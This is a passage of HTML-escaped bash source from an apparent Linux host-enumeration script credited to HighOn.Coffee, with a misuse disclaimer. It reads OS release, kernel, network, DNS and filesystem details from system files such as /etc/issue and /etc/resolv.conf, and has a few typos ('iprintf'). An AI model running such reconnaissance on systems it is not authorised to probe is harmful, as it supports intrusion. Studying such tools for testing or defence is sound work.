&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Author: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; @Arr0way &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.4
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Disclaimer: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; HighOn.Coffee is not responsible for misuse or for any damage that you may cause! &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
 You agree that you use this software at your own risk. &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;3

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Linux Version&quot;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt; 
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/bin/cat /etc/issue&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
/bin/cat /etc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-release&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Kernel Info&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/bin/uname &lt;span class=&quot;nt&quot;&gt;-ar&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Network Info&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;


/bin/cat /etc/sysconfig/network
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/bin/cat /etc/resolv.conf

iprintf &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; File System Info&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/bin/df &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;

iprintf &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Mounted File Systems with Pretty Output&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/bin/df &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;

mount | column &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
